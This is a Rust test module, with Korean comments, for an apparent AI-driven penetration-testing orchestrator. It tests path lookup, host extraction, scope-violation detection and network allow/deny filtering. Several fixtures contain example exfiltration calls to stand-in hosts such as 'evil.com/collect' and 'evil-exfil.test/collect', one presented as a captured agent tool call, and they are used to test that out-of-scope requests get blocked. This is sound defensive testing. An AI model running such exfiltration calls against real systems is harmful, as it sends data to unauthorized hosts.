        assert!(found.is_ok(), "Windows npm 전역 레이아웃을 찾아야 한다: {found:?}");
        assert_eq!(
            found.unwrap().to_string_lossy(),
            cli.to_string_lossy(),
            "정확히 %APPDATA%\\npm\\...\\dist\\cli.js 여야 한다"
        );
        std::fs::remove_dir_all(&fake).ok();
        for (k, v) in saved {
            match v {
                Some(v) => std::env::set_var(k, v),
                None => std::env::remove_var(k),
            }
        }
    }

    /// pi 1.3.0 정식 진입점 우선: dist/bundle/cli.js 와 dist/cli.js 가 둘 다 있으면
    /// bundle 을 선택하고, bundle 만 없을 때 구 경로로 폴백한다.
    #[test]
    fn prime_cli_path_prefers_bundle_entry() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = [
            ("REDCELL_PI_DIR", std::env::var_os("REDCELL_PI_DIR")),
            ("PI_PACKAGE_DIR", std::env::var_os("PI_PACKAGE_DIR")),
        ];
        let fake = std::env::temp_dir().join(format!("redcell-bundle-{}", std::process::id()));
        let bundle = fake.join("dist").join("bundle").join("cli.js");
        let legacy = fake.join("dist").join("cli.js");
        std::fs::create_dir_all(bundle.parent().unwrap()).unwrap();
        std::fs::write(&bundle, "// bundle cli").unwrap();
        std::fs::write(&legacy, "// legacy cli").unwrap();
        std::env::set_var("REDCELL_PI_DIR", &fake);
        std::env::remove_var("PI_PACKAGE_DIR");
        let found = prime_cli_path("C:\\workspace\\redcell").expect("REDCELL_PI_DIR 설치를 찾아야 한다");
        assert_eq!(found, bundle, "bundle 진입점이 우선이어야 한다: {found:?}");
        // bundle 삭제 → 구 경로 폴백.
        std::fs::remove_file(&bundle).unwrap();
        let found2 = prime_cli_path("C:\\workspace\\redcell").expect("구 경로로 폴백해야 한다");
        assert_eq!(found2, legacy, "bundle 이 없으면 dist/cli.js 로 폴백: {found2:?}");
        std::fs::remove_dir_all(&fake).ok();
        for (k, v) in saved {
            match v {
                Some(v) => std::env::set_var(k, v),
                None => std::env::remove_var(k),
            }
        }
    }

    /// tool_execution_end 요약: content 첫 텍스트를 한 줄로, 없으면 details.
    #[test]
    fn tool_result_summary_shapes() {
        let ev = serde_json::json!({
            "result": { "content": [{ "type": "text", "text": "200 OK\nnginx/1.24" }], "details": {} }
        });
        assert_eq!(tool_result_summary(&ev), " — 200 OK nginx/1.24");
        let ev2 = serde_json::json!({ "result": { "content": [], "details": { "code": 404 } } });
        assert!(tool_result_summary(&ev2).contains("404"), "details 폴백: {}", tool_result_summary(&ev2));
        let ev3 = serde_json::json!({});
        assert_eq!(tool_result_summary(&ev3), "");
    }

    /// 심층 워커 정의: 5개 분야, id/label/title/brief 완비, 지시문 자족성.
    #[test]
    fn deep_workers_five_vectors() {
        assert_eq!(DEEP_WORKERS.len(), 5, "워커는 5개 분야여야 한다");
        for def in DEEP_WORKERS {
            assert!(!def.id.is_empty() && !def.label.is_empty() && !def.title.is_empty() && !def.brief.is_empty());
            let inst = deep_worker_instruction(def, "http://t/", "쇼핑몰", "", "");
            assert!(inst.contains(def.title), "지시문에 분야 명시: {}", def.id);
            assert!(inst.contains("web_fetch"), "웹 조회 수단 명시: {}", def.id);
            assert!(inst.contains("## 워커 발견"), "출력 형식 명시: {}", def.id);
        }
        let merge = deep_merge_instruction("http://t/", "", "--- W1 ---\n- [높음] x", "");
        assert!(merge.contains("collector"), "병합자 역할 명시");
        assert!(merge.contains("### 루트 1"), "리포트 형식 포함");
        assert!(merge.contains("멘토 노트"), "멘토 노트 라벨 포함");
    }

    /// 호스트 추출 — URL 스킴·IPv4·host 계열 필드를 args JSON 에서 수집 (중복 제거).
    #[test]
    fn extract_hosts_shapes() {
        let v = serde_json::json!({"url": "https://demo.vulnlab.local:8443/a?x=1"});
        assert_eq!(extract_hosts("web_fetch", &v), vec!["demo.vulnlab.local"]);
        let v = serde_json::json!({"code": "u1=urllib.request.urlopen(\"http://10.0.0.9/x\"); u2=requests.get('https://evil.com/')"});
        let mut h = extract_hosts("python_repl", &v);
        h.sort();
        assert_eq!(h, vec!["10.0.0.9", "evil.com"]);
        let v = serde_json::json!({"host": "10.1.2.3", "port": 8080});
        assert_eq!(extract_hosts("recon_http", &v), vec!["10.1.2.3"]);
        let v = serde_json::json!({"hostname": "Sub.Example.COM"});
        assert_eq!(extract_hosts("x", &v), vec!["sub.example.com"]);
        let v = serde_json::json!({"code": "print(40 + 2)"});
        assert!(extract_hosts("python_repl", &v).is_empty());
        let v = serde_json::json!({"url": "http://a.local/1", "target": "http://a.local/2"});
        assert_eq!(extract_hosts("x", &v), vec!["a.local"]); // 중복 제거
    }

    /// 반응형 게이트 판정 — 인가 안이면 통과(None), 밖이면 위반 사유.
    #[test]
    fn decide_tool_violation_cases() {
        let auth = auth::AuthList {
            allows: vec!["demo.vulnlab.local".into(), "10.0.0.0/24".into()],
            denies: vec!["10.0.0.9".into()],
            ..Default::default()
        };
        let ok = serde_json::json!({"code": "urllib.request.urlopen(\"https://demo.vulnlab.local/\")"});
        assert!(decide_tool_violation(&auth, "python_repl", &ok).is_none());
        let ok2 = serde_json::json!({"host": "10.0.0.5"});
        assert!(decide_tool_violation(&auth, "recon_http", &ok2).is_none());
        let bad = serde_json::json!({"code": "requests.get('https://evil.com/collect')"});
        let v = decide_tool_violation(&auth, "python_repl", &bad).expect("위반이어야 한다");
        assert!(v.contains("evil.com"), "위반 사유에 호스트 명시: {v}");
        let denied = serde_json::json!({"url": "http://10.0.0.9/x"});
        assert!(decide_tool_violation(&auth, "web_fetch", &denied).is_some(), "deny가 이겨야 한다");
        let local = serde_json::json!({"code": "print(40 + 2)"});
        assert!(decide_tool_violation(&auth, "python_repl", &local).is_none(), "대상 없는 호출은 통과");
        let yaml = auth::AuthList { yaml: true, ..Default::default() };
        assert!(decide_tool_violation(&yaml, "python_repl", &bad).is_none(), "YAML scope는 해석 불가 — kill 없음(스킬 수준만)");
    }

    /// prime-agent 실측 이벤트 그대로의 위반 판정 — 실바이너리 캡처 verbatim 픽스처.
    #[test]
    fn decide_tool_violation_prime_fixture() {
        // prime-agent 0.10.0 --mode json 실측 tool_execution_start 전문verbatim.
        let ev = serde_json::json!({
            "type": "tool_execution_start", "toolCallId": "call_9",
            "toolName": "python_repl",
            "args": {"code": "import urllib.request; print(urllib.request.urlopen(\"http://evil-exfil.test/collect\", timeout=10).status)"}
        });
        let auth = auth::AuthList { allows: vec!["demo.vulnlab.local".into()], ..Default::default() };
        let v = decide_tool_violation(&auth, "python_repl", &ev["args"]).expect("미인가 호스트는 위반");
        assert!(v.contains("evil-exfil.test"), "{v}");
    }

    /// 스코프 스킬 생성 — prime-agent --skill 주입용 SKILL.md (frontmatter + scope).
    #[test]
    fn write_scope_skill_shape() {
        let dir = std::env::temp_dir().join(format!("rc-skill-{}", std::process::id()));
        let p = write_scope_skill(&dir, &["demo.vulnlab.local".into(), "10.0.0.0/24".into()], &["10.0.0.9".into()]).unwrap();
        let text = std::fs::read_to_string(&p).unwrap();
        assert!(text.starts_with("---\nname: redcell-scope\n"), "frontmatter 필요:\n{text}");
        assert!(text.contains("demo.vulnlab.local") && text.contains("10.0.0.0/24"), "허용 목록 포함");
        assert!(text.contains("10.0.0.9"), "제외 목록 포함");
        assert!(text.contains("python_repl"), "prime 도구 안내 포함");
        std::fs::remove_dir_all(&dir).ok();
    }

    /// prime-agent 실행 인자 — 바이너리+--mode json+--print+--skill+--session-dir.
    #[test]
    fn prime_run_args_shape() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = std::env::var_os("REDCELL_PRIME_BIN");
        let fake = std::env::temp_dir().join(format!("prime-bin-{}", std::process::id()));
        std::fs::write(&fake, "#!/bin/sh\necho prime\n").unwrap();
        std::env::set_var("REDCELL_PRIME_BIN", &fake);
        let settings = Settings::default();
        let skill = PathBuf::from("/tmp/x/SKILL.md");
        let sdir = PathBuf::from("/tmp/x/sess");
        let (prog, args) = prime_run_args(&settings, "openai", &skill, &sdir, true, "진단해줘".into()).unwrap();
        assert_eq!(prog, fake);
        let joined = args.join(" ");
        for frag in ["--mode", "json", "--print", "--skill", "/tmp/x/SKILL.md", "--session-dir", "/tmp/x/sess", "--continue", "--provider", "openai"] {
            assert!(args.iter().any(|a| a == frag), "인자 누락: {frag}\n전체: {joined}");
        }
        assert!(args.iter().any(|a| a == "진단해줘"), "지시문 포함: {joined}");
        // --continue 없음 (새 세션).
        let (_, args2) = prime_run_args(&settings, "openai", &skill, &sdir, false, "x".into()).unwrap();
        assert!(!args2.iter().any(|a| a == "--continue"), "새 세션에 --continue 금지");
        std::fs::remove_file(&fake).ok();
        match saved {
            Some(v) => std::env::set_var("REDCELL_PRIME_BIN", v),
            None => std::env::remove_var("REDCELL_PRIME_BIN"),
        }
    }

    /// prime-agent models.json 경로 — ~/.prime/agent/models.json.
    #[test]
    fn prime_models_json_path_shape() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = [("HOME", std::env::var_os("HOME")), ("USERPROFILE", std::env::var_os("USERPROFILE"))];
        std::env::set_var("HOME", "/tmp/fakehome");
        std::env::remove_var("USERPROFILE");
        let p = prime_models_json_path().unwrap();
        assert_eq!(p, PathBuf::from("/tmp/fakehome/.prime/agent/models.json"), "{p:?}");
        for (k, v) in saved {
            match v {
                Some(v) => std::env::set_var(k, v),
                None => std::env::remove_var(k),
            }
        }
    }

    /// 프로바이더 API 호스트 — conn.base_url 우선, 없으면 카탈로그 기본값.
    #[test]
    fn provider_api_host_prefers_custom_base() {
        let settings = Settings::default();
        assert_eq!(provider_api_host("anthropic", &settings).as_deref(), Some("api.anthropic.com"));
        assert_eq!(provider_api_host("openai", &settings).as_deref(), Some("api.openai.com"));
        assert_eq!(provider_api_host("no-such", &settings), None);
        let mut s2 = Settings::default();
        s2.providers.insert(
            "custom".into(),
            ProviderConn { api_key: String::new(), base_url: "http://llm.local:8080/v1".into(), model: "x".into(), api: String::new() },
        );
        assert_eq!(provider_api_host("custom", &s2).as_deref(), Some("llm.local"));
    }

    /// ALLOW/DENY 스펙 조립 — 중복 제거·쓰레기 제거·deny 분리.
    #[test]
    fn netfilter_spec_shape() {
        let allows = vec!["10.0.0.0/8".to_string(), " Example.COM ".to_string(), "".to_string(), "http://x/".to_string()];
        let denies = vec!["10.9.9.9".to_string()];
        let extra = vec!["example.com".to_string(), "api.anthropic.com".to_string()];
        let (allow, deny) = build_netfilter_spec(&allows, &denies, &extra);
        assert_eq!(allow, "10.0.0.0/8,Example.COM,api.anthropic.com");
        assert_eq!(deny, "10.9.9.9");
    }

    /// .so 탐색 — 명시 override 가 깨졌으면 폴백 없이 None (은폐 방지).
    #[test]
    fn netfilter_so_override_broken_is_none() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = std::env::var_os("REDCELL_NETFILTER_SO");
        std::env::set_var("REDCELL_NETFILTER_SO", "/nonexistent-nf-xyz.so");
        assert_eq!(netfilter_so_path(), None);
        match saved {
            Some(v) => std::env::set_var("REDCELL_NETFILTER_SO", v),
            None => std::env::remove_var("REDCELL_NETFILTER_SO"),
        }
    }

    /// 발견 키 추출 — 등급 줄만 정규화·순서 유지·중복 제거.
    #[test]
    fn finding_keys_normalize_and_dedup() {
        let text = "## 워커 발견 (W1·정찰 표면 정찰)\n- [중간] 보안 헤더 누락 — CSP 없음 / 근거: 헤더 원문\n- [중간] 보안 헤더 누락 — CSP 없음 / 근거: 헤더 원문\n잡담 줄은 무시된다\n* [높음] .env 노출 — 키 확인";
        let keys = extract_finding_keys(text);
        assert_eq!(keys.len(), 2, "{keys:?}");
        assert!(keys[0].contains("보안헤더누락"));
        assert!(keys[1].contains("env노출"));
    }

    /// 추적 지시문 — 라운드·자가 요약·교차 단서·추가 발견 형식 포함.
    #[test]
    fn followup_instruction_shape() {
        let def = &DEEP_WORKERS[2];
        let inst = deep_followup_instruction(def, 2, "- [높음] IDOR 신호", "- [단서:w2] sqli", "http://t/");
        assert!(inst.contains("추적 라운드 2"));
        assert!(inst.contains("W3·인증"));
        assert!(inst.contains("IDOR"));
        assert!(inst.contains("## 추가 발견"));
        assert!(inst.contains("web_fetch"));
        // prime 치환 후에도 골격 유지.
        let pa = prime_adapt(inst);
        assert!(pa.contains("python_repl+urllib") && pa.contains("## 추가 발견"));
    }

    /// .so 탐색 — 실행파일 옆 산출물을 찾는다 (build.rs 가 생성).
    #[test]
    fn netfilter_so_found_next_to_exe() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = std::env::var_os("REDCELL_NETFILTER_SO");
        std::env::remove_var("REDCELL_NETFILTER_SO");
        let found = netfilter_so_path();
        match saved {
            Some(v) => std::env::set_var("REDCELL_NETFILTER_SO", v),
            None => std::env::remove_var("REDCELL_NETFILTER_SO"),
        }
        assert!(found.map(|p| p.is_file()).unwrap_or(false), "build.rs 산출물 미발견");
    }
}
